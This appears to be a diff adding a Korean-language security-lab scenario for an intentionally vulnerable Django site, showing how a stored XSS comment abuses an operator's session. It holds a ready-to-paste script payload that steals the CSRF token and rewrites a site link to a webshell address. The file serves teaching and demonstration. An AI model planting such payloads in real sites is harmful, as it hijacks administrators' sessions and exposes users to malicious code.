@@ -1,0 +1,29 @@
+[시나리오 A] 권한 악용 — 운영자 브라우저에서 '강제 요청'
+──────────────────────────────────────────────────────────
+전제:
+  - DJANGO_SETTINGS_MODULE=config.settings.vulnerable (댓글 |safe 렌더)
+  - 아래 댓글을 게시글에 등록한 뒤, '운영자'가 그 댓글을 '열람'해야 실행된다.
+
+동작:
+  - 운영자 세션으로 /operator/links/ 에 POST 하여 'resume' 링크를
+    업로드 실행 서비스의 웹쉘 주소로 '변조'한다.
+  - 세션 쿠키가 HttpOnly 여도 동작한다(브라우저가 쿠키를 자동 첨부).
+    CSRF 토큰은 same-origin 스크립트가 csrftoken 쿠키에서 읽어 헤더로 넣는다
+    → CSRF 보호만으로는 same-origin XSS 를 막지 못함을 보인다.
+
+댓글 본문에 그대로 붙여넣기:
+──────────────────────────────────────────────────────────
+<script>
+(function(){
+  function c(n){var m=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return m?m.pop():'';}
+  var body='key=resume&url='+encodeURIComponent('http://localhost:8000/uploads/run/webshell.sh');
+  fetch('/operator/links/',{method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRFToken':c('csrftoken')},
+    credentials:'same-origin', body:body});
+})();
+</script>
+──────────────────────────────────────────────────────────
+확인:
+  - /operator/audit/ 에 action=link_change, actor=operator 기록
+  - 메인 페이지 'resume' 링크에 '변조됨' 배지 표시
+  - /lab/status/ 의 '변조된 링크' 수치 증가
